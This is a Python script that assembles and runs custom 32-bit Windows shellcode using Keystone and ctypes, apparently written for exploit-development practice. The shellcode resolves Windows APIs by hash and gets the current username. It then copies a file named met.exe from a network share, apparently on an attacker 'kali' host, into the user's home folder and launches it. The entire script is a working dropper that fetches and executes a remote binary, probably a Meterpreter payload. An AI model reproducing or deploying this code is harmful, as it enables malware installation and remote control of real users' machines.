from keystone import *
import sys
import ctypes, struct

def asm2shell(c):
    print("Generate shellcode ...")
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(c)
    sh = b""
    instructions = ""
    for e in encoding: 
        sh += struct.pack("B",e)
        instructions += "\\x{0:02x}".format(int(e)).rstrip("\n") 
    print("Shellcode size: %d bytes"%(count))
    shellcode = bytearray(sh)
    print("Shellcode: %s"%instructions)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    print("Shellcode located at address %s" % hex(ptr))
    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))



code = "start:"
# Setup stack
code += "mov ebp, esp;"
code += "add esp, 0xfffff9f0 ;"
# Find_kernel32
code += "find_kernel32: "
code += "xor ecx, ecx;"
code += "mov esi, fs:[ecx + 0x30];" # PEB
code += "mov esi, [esi + 0x0c];" # PEB -> Ldr
code += "mov esi, [esi + 0x1c];" #PEB -> Ldr.InInitOrder
code += "next_module: "
code += "mov ebx, [esi + 8];" # InInitOrder[i].base_address
code += "mov edi, [esi + 0x20];" # InInitOrder[X].module_name
code += "mov esi, [esi];" # InInitOrder[X].flink
code += "cmp [edi + 12*2], cx;" # if module_name[12] == 0
code += "jne next_module;"

# find_function_shorten
code += "find_function_shorten:"
code += "jmp find_function_shorten_bnc;"
code += "find_function_ret:"
code += "pop esi;" # save ret address to esi
code += "mov [ebp + 0x4], esi;" # save ret address
code += "jmp resolve_symbols_kernel32;"
code += "find_function_shorten_bnc:"
code += "call find_function_ret;"

# find function
code += "find_function:"
code += "pushad;"
code += "mov eax, [ebx + 0x3c];" # PE Signature
code += "mov edi, [ebx + eax + 0x78];" # Directory RVA
code += "add edi, ebx;" # Directory VMA
code += "mov ecx, [edi + 0x18];" # NumberOfNames
code += "mov eax, [edi + 0x20];" # AddressOfNames RVA
code += "add eax, ebx;" # AddressOfNames VMA
code += "mov [ebp-4], eax;" # AddressOfNames VMA
code += "find_function_loop:"
code += "jecxz find_function_finished;"
code += "dec ecx;"
code += "mov eax, [ebp-4];"
code += "mov esi, [eax + ecx*4];" # Get the RVA of the symbol name
code += "add esi, ebx;"

# compute hash
code += "compute_hash:"
code += "xor eax, eax;" # clear eax
code += "cdq;" # clear edx
code += "cld;" # clear direaction? 
code += "compute_hash_again:"
code += "lodsb;" # load next byte from esi to al
code += "test al, al;"
code += "jz compute_hash_finished;"
code += "ror edx, 0x0d;"
code += "add edx, eax;"
code += "jmp compute_hash_again;"
code += "compute_hash_finished:"
code += "cmp edx, [esp + 0x24];"
code += "jnz find_function_loop;"
code += "mov edx, [edi + 0x24];"
code += "add edx, ebx;"
code += "mov cx, [edx + 2 * ecx];"
code += "mov edx, [edi + 0x1c];"
code += "add edx, ebx;"
code += "mov eax, [edx + 4 * ecx];"
code += "add eax, ebx;"
code += "mov [esp + 0x1c], eax;"


code += "find_function_finished:"
code += "popad;"
code += "ret;"

#  resolve kernel32 symbol
code += "resolve_symbols_kernel32:"
code += "push 0x78b5b983;" # TerminateProcess
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x10], eax;" # save TerminateProcess 

code += "push 0xec0e4e8e;" # LoadLibraryA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x14], eax;" # save LoadLibraryA

code += "push 0x16b3fe72;" # CreateProcessA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x18], eax;" # save CreateProcessA

# load CopyFileA
code += "push 0x99ec895e;" # CopyFileA hash
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x1c], eax;"

# call LoadLibraryA
# load ADVAPI32.dll
code += "xor eax, eax;"
code += "push eax;"         # push null byte to end library name
code += "push 0x6c6c642e;"  # dll
code += "push 0x32334950;"  #
code += "push 0x41564441;"  #
code += "push esp;"         # Name address
code += "call [ebp + 0x14];"# call LoadLibraryA
code += "mov ebx, eax;"

# load GetUserNameA  
code += "push 0x5c52aa34;"
code += "call dword ptr [ebp+0x4];"
code += "mov [ebp + 0x20], eax;"

# pcbBuffer
code += "mov eax, 0xfffffff0;" # max user length 10
code += "neg eax;"
code += "push eax;"
code += "push esp;"
# lpBuffer
code += "lea eax, [ebp + 0x24];" # save username in ebp + 0x24
code += "push eax;"
# call GetUserNameA
code += "call [ebp + 0x20];"
code += "mov ecx, [esp];"

code += "int3;"
# Dynamically create the path for the home folder of the user given the output
# push C:\Users\
code += "mov esi, esp;"
code += "xor edx, edx;"
# push string C:\Users\
code += "mov eax, 0xffffffa4;"
code += "neg eax;"
code += "push eax;"
code += "push 0x73726573;"
code += "push 0x555c3a43;"
code += "mov edi, esp;"             # save user path
code += "lea eax, [ebp+0x24];"      # save user name address to eax
code += "add esi, 0xfffffffd;" 
# concat username with C:\Users\
code += "copyChar:"
code += "mov dl, [eax];"
code += "mov [esi], dl;"
code += "inc esi;"
code += "inc eax;"
code += "dec ecx;"
code += "jnz  copyChar;"

# concat name with \met.exe
code += "dec esi;"
code += "mov eax, 0x74656d5c;"
code += "mov [esi], eax;"
code += "sub esi, 0xfffffffc;"
code += "mov eax, 0x6578652e;"
code += "mov [esi], eax;"
code += "sub esi, 0xfffffffc;"
code += "xor eax, eax;"
code += "mov [esi], eax;" 

# init
code += "xor eax, eax;"
code += "mov ax, 0x6578;"   # ex
code += "push eax;"
code += "push 0x652e7465;" # e.te
code += "push 0x6d5c7465;" # m\te
code += "push 0x6d5c696c;" # m\il
code += "push 0x616b5c5c;" # ak\\
code += "mov ebx, esp;"

# call CopyFileA
code += "push 0xffffffff;" # bFailIfExists = False
code += "push edi;" # lpNewFileName
code += "push ebx;" # lpExistingFileName
code += "call [ebp + 0x1c];"


# setup lpsStartupInfo
code += "   xor   eax, eax  ;"  #   Null EAX  
code += "   push  eax   ;"  #   Push hStdError
code += "   push  eax   ;"  #   Push hStdOutput
code += "   push  eax   ;"  #   Push hStdInput
code += "   push  eax   ;"  #   Push lpReserved2
code += "   push  eax   ;"  #   Push cbReserved2 & wShowWindow
code += "   mov   ax, 0x101  ;"  #   Move 0x80 to AL
code += "   dec eax;    "
code += "   push  eax   ;"  #   Push dwFlags
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push dwFillAttribute
code += "   push  eax   ;"  #   Push dwYCountChars
code += "   push  eax   ;"  #   Push dwXCountChars
code += "   push  eax   ;"  #   Push dwYSize
code += "   push  eax   ;"  #   Push dwXSize
code += "   push  eax   ;"  #   Push dwY
code += "   push  eax   ;"  #   Push dwX
code += "   push  eax   ;"  #   Push lpTitle
code += "   push  eax   ;"  #   Push lpDesktop
code += "   push  eax   ;"  #   Push lpReserved
code += "   mov   al, 0x44  ;"  #   Move 0x44 to AL
code += "   push  eax   ;"  #   Push cb
code += "   push  esp   ;"  #   Push pointer to the STARTUPINFOA structure
code += "   pop   esi   ;"  #   Store pointer to STARTUPINFOA in EDI

# call CreateProcessA
code += "   mov   eax, esp  ;"  #   Move ESP to EAX
code += "   xor   ecx, ecx  ;"  #   Null ECX
code += "   mov   cx, 0x390 ;"  #   Move 0x390 to CX
code += "   sub   eax, ecx  ;"  #   Subtract CX from EAX to avoid overwriting the structure later

code += "   mov   eax, esp  ;"  #   Move ESP to EAX
code += "   xor   ecx, ecx  ;"  #   Null ECX
code += "   mov   cx, 0x390 ;"  #   Move 0x390 to CX
code += "   sub   eax, ecx  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
code += "   push  eax   ;"  #   Push lpProcessInformation
code += "   push  esi   ;"  #   Push lpStartupInfo
code += "   xor   eax, eax  ;"  #   Null EAX   
code += "   push  eax   ;"  #   Push lpCurrentDirectory
code += "   push  eax   ;"  #   Push lpEnvironment
code += "   push  eax   ;"  #   Push dwCreationFlags
code += "   inc   eax   ;"  #   Increase EAX, EAX = 0x01 (TRUE)
code += "   push  eax   ;"  #   Push bInheritHandles
code += "   dec   eax   ;"  #   Null EAX
code += "   push  eax   ;"  #   Push lpThreadAttributes
code += "   push  eax   ;"  #   Push lpProcessAttributes
code += "   push  eax   ;"  #   Push lpCommandLine
code += "   push  edi   ;"  #   Push lpApplicationName
code += "   call dword ptr [ebp+0x18]   ;"  #   Call CreateProcessA


# TerminateProcess
code += "push 0x11223344;" # uExitCode
code += "push 0xffffffff;" # hProcess
code += "call [ebp + 0x10];" # call TerminateProcess
asm2shell(code)
